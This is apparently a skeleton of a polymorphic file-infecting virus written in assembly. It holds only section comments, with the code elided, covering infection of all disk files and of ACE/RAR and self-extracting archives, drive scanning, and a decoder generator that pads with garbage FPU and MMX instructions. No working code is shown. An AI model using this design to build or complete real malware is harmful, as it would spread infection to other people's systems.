...
;───┤ main function of infect all filez on disks ├────────────────────────
...
;───┤ infection in ACE/RAR and ACE/RAR EXE-SFX archivez ├─────────────────
;   └────────────────▼ We Already Know ▼────────────────┘
;
;	■ ACE/RAR archive certainly exists
;	■ in _filename_ has his name
;	■ dta is full
;
...
;───┤ other common functionz for ACE/RAR archivez ├───────────────────────
...
;───┤ function to get kernel's address ├──────────────────────────────────
...
;───┤ search fixed, cd-rom, ram-disk, etc. ├──────────────────────────────
...
;───┤ generate code which will detect mmx support ├───────────────────────
...
;───┤ function to clear copro and mmx regs ├──────────────────────────────
...
;───┤ generate code to get delta-address ├────────────────────────────────
...
;───┤ generate code to set index for decode-loop ├────────────────────────
...
;───┤ generate code to set code value ├───────────────────────────────────
...
;───┤ generate code to set counter random-value ├─────────────────────────
...
;───┤ generate encrypted body of this virus ├─────────────────────────────
...
;───┤ function to build poly-decoder ├────────────────────────────────────
...
;───┤ function to select new code-value ├─────────────────────────────────
		__ppe_gnc_random	db	?
ppe_get_next_code:
...
;───┤ function to select next counter ├───────────────────────────────────
...
;───┤ function to generate decoder-loop ├─────────────────────────────────
...
;───┤ function to jump to decode-virus-body ├─────────────────────────────
...
;───┤ generate one byte instruction that does not change regs ├───────────
...
;───┤ generate add/sub/xor/and/adc/sbb/or reg,imm ├───────────────────────
...
;───┤ generate movzx,movsx reg32/16,reg16/8 ├─────────────────────────────
...
;───┤ generate rol/ror/rcl/rcr/shl/shr/sar reg,imm ├──────────────────────
...
;───┤ generate rol/ror/rcl/rcr/shl/shr/sar reg,reg8 ├─────────────────────
...
;───┤ generate bt/bts/btr/btc reg32/16,(reg/imm)32/16 ├───────────────────
...
;───┤ generate add/sub/xor/and/adc/sbb/or reg,reg ├───────────────────────
...
;───┤ generate reg + garbage + dec reg + jnz reg ├────────────────────────
;   └───────────► sado-maso function ◄───────────┘
...
;───┤ generate reg32 + call reg32 + rnd_block + pop reg32 ├───────────────
...
;───┤ generate reg32 + jump reg32 + rnd_block ├───────────────────────────
...
;───┤ generate rep/repnz + cmps/lods/stos/scas/movs ├─────────────────────
;   └─────────────► sado-maso function ◄────────────┘
...
;───┤ generate push value(32/16)/garbage/pop reg32 ├──────────────────────
...
;───┤ function to crypt a random value to reg32 ├─────────────────────────
...
;───┤ function to simulate end of encode-loop ├───────────────────────────
...
;───┤ function to simulate return to host ├───────────────────────────────
;   └───────► sado-maso function ◄────────┘
...
;───┤ generate fld/fild/fld(pi,1,ln2,lg2,l2e,l2t,z) ├─────────────────────
...
;───┤ generate fst/fist (word/dword/qword) ├──────────────────────────────
...
;───┤ generate fadd/fiadd/fsub/fisub (word/dword/qword - ST(x),ST) ├──────
...
;───┤ generate fsin/fcos/fsincos/fpatan/fabs/frndint/ffree/fxch... ├──────
...
;───┤ generate fully 46 instructions of MMX ├─────────────────────────────
...
;───┤ function to rotate with coprocessor regs	├─────────────────────────
...
;───┤ function for mov base-reg to copro-reg ├────────────────────────────
...
;───┤ function for mov copro-reg to base-reg ├────────────────────────────
...
;───┤ function to calculate a free place in mem (only copro) ├────────────
...
;───┤ function to fix delta for copro operations ├────────────────────────
...
;───┤ function to crypt a destination value ├─────────────────────────────
;   └─────────► sado-maso function ◄────────┘
...
;───┤ function to put CPUID and MMX test to poly-decode loop ├────────────
;   └─────────────────► sado-maso function ◄─────────────────┘
...
;───┤ function for simulate MMX and Copro code ├──────────────────────────
...
;───┤ function for generate reg32 <-> mm(0..7) / movd/movq ├──────────────
...
;───┤ function for generate add/sub with MMX and reg32 ├──────────────────
...
;───┤ function to add/sub/mov with copro/mmx reg ├────────────────────────
...
;───┤ function to put base-reg32 to memory ├──────────────────────────────
...
;───┤ function for write insignificant data ├─────────────────────────────
...
;───┤ functions returns (empty) base/mmx/copro reg ├──────────────────────
...
;───┤ function to detect/set an empty reg from base/copro/mmx ├───────────
...
;───┤ memory buffer which ain't in file ├─────────────────────────────────
file_end:
